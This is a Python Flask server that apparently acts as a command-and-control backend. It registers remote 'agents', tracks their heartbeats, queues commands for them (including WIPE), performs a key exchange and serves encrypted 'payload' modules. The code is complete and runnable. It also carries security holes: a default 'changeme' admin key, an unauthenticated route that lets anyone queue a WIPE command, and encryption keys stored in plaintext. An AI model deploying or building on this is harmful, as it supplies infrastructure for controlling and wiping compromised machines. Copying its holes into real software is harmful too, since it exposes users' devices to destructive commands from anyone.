from flask import Flask, request, jsonify, abort
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
import logging
import base64
import os
import json
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sympadding

from functools import wraps

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///dduf.db'
db = SQLAlchemy(app)

logging.basicConfig(level=logging.INFO)

TIMEOUT_SECONDS = 180
ADMIN_API_KEY = os.environ.get('ADMIN_API_KEY', 'changeme')


def require_api_key(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        key = request.headers.get('X-API-KEY')
        if key != ADMIN_API_KEY:
            abort(401)
        return f(*args, **kwargs)
    return wrapper

class Client(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    uuid = db.Column(db.String(64), unique=True, nullable=False)
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
    public_key = db.Column(db.Text)
    aes_key = db.Column(db.Text)
    online = db.Column(db.Boolean, default=False)

class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
    command = db.Column(db.String(64))
    parameters = db.Column(db.Text)
    executed = db.Column(db.Boolean, default=False)

class LogEntry(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
    message = db.Column(db.String(256))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

def log_event(client, message):
    entry = LogEntry(client_id=client.id, message=message)
    db.session.add(entry)
    db.session.commit()


def check_timeouts():
    now = datetime.utcnow()
    threshold = now - timedelta(seconds=TIMEOUT_SECONDS)
    outdated = Client.query.filter(Client.last_seen < threshold, Client.online == True).all()
    for c in outdated:
        c.online = False
    if outdated:
        db.session.commit()


def register_client(uuid):
    check_timeouts()
    client = Client.query.filter_by(uuid=uuid).first()
    if not client:
        client = Client(uuid=uuid)
        db.session.add(client)
    client.last_seen = datetime.utcnow()
    client.online = True
    db.session.commit()
    log_event(client, 'register')
    return client

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    client = register_client(data['uuid'])
    return jsonify({'id': client.id})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    client = register_client(data['uuid'])
    log_event(client, 'heartbeat')
    return jsonify({'status': 'ok'})

@app.route('/command/<uuid>', methods=['POST'])
def add_command(uuid):
    data = request.get_json()
    cmd = data.get('command') or data.get('cmd')
    params = data.get('parameters', {})
    client = Client.query.filter_by(uuid=uuid).first()
    if not client or not cmd:
        return jsonify({'error': 'invalid'}), 400
    if cmd in ('SAFE_MODE', 'WIPE', 'DEEP_SLEEP'):
        logging.info('%s issued for %s', cmd, uuid)
    log_event(client, f'queue {cmd}')
    c = Command(client_id=client.id, command=cmd, parameters=json.dumps(params))
    db.session.add(c)
    db.session.commit()
    return jsonify({'status': 'queued'})

@app.route('/commands/<uuid>', methods=['GET'])
def get_commands(uuid):
    client = Client.query.filter_by(uuid=uuid).first()
    if not client:
        return jsonify({'commands': []})
    cmds = Command.query.filter_by(client_id=client.id, executed=False).all()
    result = []
    for c in cmds:
        params = json.loads(c.parameters) if c.parameters else {}
        result.append({'command': c.command, 'parameters': params})
    for c in cmds:
        c.executed = True
    db.session.commit()
    return jsonify({'commands': result})

@app.route('/update/<int:client_id>', methods=['POST'])
def update(client_id):
    return jsonify({'status': 'received'})

@app.route('/key_exchange', methods=['POST'])
def key_exchange():
    data = request.get_json(force=True)
    uuid = data.get('uuid')
    pub_pem = data.get('public_key')
    if not uuid or not pub_pem:
        return jsonify({'error': 'invalid'}), 400
    client = register_client(uuid)
    client.public_key = pub_pem
    public_key = load_pem_public_key(pub_pem.encode())
    aes_key = os.urandom(32)
    enc_key = public_key.encrypt(
        aes_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    client.aes_key = base64.b64encode(aes_key).decode()
    db.session.commit()
    return jsonify({'aes_key': base64.b64encode(enc_key).decode()})


@app.route('/payload/<uuid>/<module>', methods=['GET'])
def get_payload(uuid, module):
    client = Client.query.filter_by(uuid=uuid).first()
    if not client or not client.aes_key:
        return jsonify({'error': 'unknown'}), 404
    path = os.path.join('payloads', module)
    if not os.path.exists(path):
        return jsonify({'error': 'not found'}), 404
    with open(path, 'rb') as f:
        data = f.read()
    key = base64.b64decode(client.aes_key)
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    padder = sympadding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()
    enc = encryptor.update(padded) + encryptor.finalize()
    blob = base64.b64encode(iv + enc).decode()
    return jsonify({'payload': blob})


@app.route('/status/<uuid>', methods=['GET'])
def status(uuid):
    check_timeouts()
    client = Client.query.filter_by(uuid=uuid).first()
    if not client:
        return jsonify({'error': 'unknown'}), 404
    state = 'online' if client.online else 'offline'
    last = client.last_seen.isoformat() if client.last_seen else None
    return jsonify({'uuid': uuid, 'status': state, 'last_seen': last})


@app.route('/admin/agents', methods=['GET'])
@require_api_key
def list_agents():
    check_timeouts()
    clients = Client.query.all()
    result = []
    for c in clients:
        result.append({
            'uuid': c.uuid,
            'online': c.online,
            'last_seen': c.last_seen.isoformat() if c.last_seen else None
        })
    return jsonify({'agents': result})


@app.route('/admin/logs/<uuid>', methods=['GET'])
@require_api_key
def agent_logs(uuid):
    client = Client.query.filter_by(uuid=uuid).first()
    if not client:
        return jsonify({'logs': []})
    logs = LogEntry.query.filter_by(client_id=client.id).order_by(LogEntry.created_at.desc()).all()
    return jsonify({'logs': [
        {'message': l.message, 'timestamp': l.created_at.isoformat()} for l in logs
    ]})


@app.route('/admin/command/<uuid>', methods=['POST'])
@require_api_key
def admin_command(uuid):
    return add_command(uuid)

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=5000)
